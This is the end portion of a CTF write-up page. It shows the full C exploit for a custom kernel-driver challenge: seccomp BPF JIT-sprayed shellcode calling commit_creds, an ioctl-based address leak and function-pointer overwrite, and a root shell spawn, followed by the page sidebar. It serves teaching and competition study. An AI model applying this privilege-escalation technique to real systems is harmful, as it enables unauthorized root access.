</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xD0</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, <span style="color:#75715e">// commit_creds(init_cred)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, <span style="color:#75715e">// pop rax * 29 + ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },  
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> }, 
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },
</span></span><span style="display:flex;"><span>    { <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0xC3</span>, <span style="color:#ae81ff">0xEB</span>, <span style="color:#ae81ff">0x01</span> },  
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((constructor))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stdin, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">setbuf</span>(stderr, NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">getuid</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">install_seccomp_filter</span>(<span style="color:#66d9ef">int</span> hash) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> idx;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_filter filter[<span style="color:#ae81ff">1000</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_filter mov_hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_IMM, hash);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_filter long_rel_jmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_IMM, <span style="color:#ae81ff">0x909008eb</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_filter short_rel_jmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_IMM, <span style="color:#ae81ff">0x909003eb</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_filter ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">BPF_STMT</span>(BPF_RET <span style="color:#f92672">|</span> BPF_K, SECCOMP_RET_ALLOW);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; idx <span style="color:#f92672">&lt;</span> LANDING_ZONE_SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>){ <span style="color:#75715e">// landing zone
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>filter[idx], <span style="color:#f92672">&amp;</span>mov_hash, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sock_filter));
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>filter[idx<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>long_rel_jmp, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sock_filter));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// last jump has to be shorter (if not we would skip some shellcode)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>filter[LANDING_ZONE_SIZE<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>short_rel_jmp, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sock_filter));
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; idx <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(shellcode); <span style="color:#f92672">++</span>idx){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> sock_filter tmp <span style="color:#f92672">=</span> <span style="color:#a6e22e">BPF_STMT</span>(BPF_LD <span style="color:#f92672">|</span> BPF_IMM, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)shellcode[idx]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>filter[idx <span style="color:#f92672">+</span> LANDING_ZONE_SIZE], <span style="color:#f92672">&amp;</span>tmp, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sock_filter));
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(<span style="color:#f92672">&amp;</span>filter[<span style="color:#ae81ff">999</span>], <span style="color:#f92672">&amp;</span>ret, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> sock_filter));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sock_fprog prog <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        .len <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span>)(<span style="color:#66d9ef">sizeof</span>(filter) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(filter[<span style="color:#ae81ff">0</span>])),
</span></span><span style="display:flex;"><span>        .filter <span style="color:#f92672">=</span> filter,
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Apply the seccomp filter
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">prctl</span>(PR_SET_NO_NEW_PRIVS, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;prctl(PR_SET_NO_NEW_PRIVS) failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">prctl</span>(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, <span style="color:#f92672">&amp;</span>prog) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;prctl(PR_SET_SECCOMP) failed&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> dev, r, pid;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span> function)(<span style="color:#66d9ef">void</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>bpf_addr, <span style="color:#f92672">*</span>code, <span style="color:#f92672">*</span>code_base;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dev <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(DEV, O_RDWR <span style="color:#f92672">|</span> O_NONBLOCK);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(dev <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">err</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;could not open device&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// exploit goes here
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">//    
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// allocate first stage shellcode (jitted)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">install_seccomp_filter</span>(VOID_STATIC_HASH);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// module &amp; seccomp filter area leak
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    r <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(dev, CMD_PWN_READ, <span style="color:#f92672">&amp;</span>function);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">err</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;ioctl read failed&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    bpf_addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)function <span style="color:#f92672">-</span> BPF_OFFSET;
</span></span><span style="display:flex;"><span>    function <span style="color:#f92672">=</span> bpf_addr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// overwrite function pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    r <span style="color:#f92672">=</span> <span style="color:#a6e22e">ioctl</span>(dev, CMD_PWN_WRITE, <span style="color:#f92672">&amp;</span>function);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(r <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) 
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">err</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;ioctl write failed&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// execute shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">ioctl</span>(dev, CMD_PWN_EXEC, x64_SYS_IOCTL_2_COMMIT_CREDS);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">getuid</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">getgid</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close</span>(dev);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>
    </div>
    <footer class="content__footer"></footer>

            </section>
            
            
                <section class="page__aside">
                    <div>
    <p>Writeup for the kernel pwn challenge that I wrote for ToH CTF 2025. In this post I will talk about a way of bypassing kCFI (norand) using BPF filters.</p>
    
        <p>
            By prosti, 
            2025-07-29
        </p>
    

    
        <hr>
        On this page:
        <section class="post__toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#description">Description</a></li>
    <li><a href="#source-code">Source code</a></li>
    <li><a href="#spotting-the-vulnerability">Spotting the vulnerability</a></li>
    <li><a href="#module-leak">Module leak</a></li>
    <li><a href="#function-pointer-overwrite">Function pointer overwrite</a></li>
    <li><a href="#loading-the-seccomp-filter">Loading the seccomp filter</a></li>
    <li><a href="#shellcode">Shellcode</a></li>
    <li><a href="#flag">Flag</a></li>
    <li><a href="#full-exploit">Full exploit</a></li>
  </ol>
</nav>
        </section>
    


                    </div>
                </section>
            

            <section class="page__about">
                <div>
    


                </div>
            </section>


            <footer class="page__footer"><p>
    
    
    
    
    
    
      
    
      
    
    
    
      
      
          
            
            
                <br/><span class="active">$ echo $LANG<br/><b></b></span><br/>

            
          
      
    
</p>
<br /><br />
<p class="advertisement" style="margin-left: 5px; font-size: 14px;">Made with love by <strong>@leave</strong> & <strong>@prosti</strong>.</p>
</footer>

        </div>
    </body>

</html>
